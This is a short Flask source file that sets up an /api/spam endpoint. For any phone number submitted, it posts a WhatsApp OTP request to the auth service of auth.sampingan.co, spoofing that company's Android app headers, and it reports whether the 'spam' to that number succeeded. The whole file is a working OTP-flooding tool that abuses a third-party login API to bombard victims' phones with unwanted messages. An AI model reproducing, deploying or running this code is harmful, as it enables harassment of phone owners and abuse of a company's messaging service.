from flask import Flask,request
from flask_cors import CORS
from flask_restful import Resource,Api
import requests,json
app=Flask(__name__)
CORS(app)
api=Api(app)

class testing(Resource):
    def post(self):
        nomor=request.form.get("nomor")
        if not nomor:
            return {"message":"Data 'nomor' belum diisi!"}
        ua={
                "Host":"auth.sampingan.co",
                "domain-name":"auth-svc",
                "app-auth":"Skip",
                "content-type":"application/json; charset=UTF-8",
                "user-agent":"okhttp/4.9.1",
                "accept":"application/vnd.full+json",
                "accept":"application/json",
                "content-type":"application/vnd.full+json",
                "content-type":"application/json",
                "app-version":"2.1.2",
                "app-platform":"Android"}
        data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
        req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
        if "error" in req:
            return {"message":f"spam ke {nomor} gagal!"}
        else:
            return {"message":f"spam ke {nomor} berhasil"}
api.add_resource(testing,"/api/spam")

if __name__=="__main__":
    app.run(debug=True)
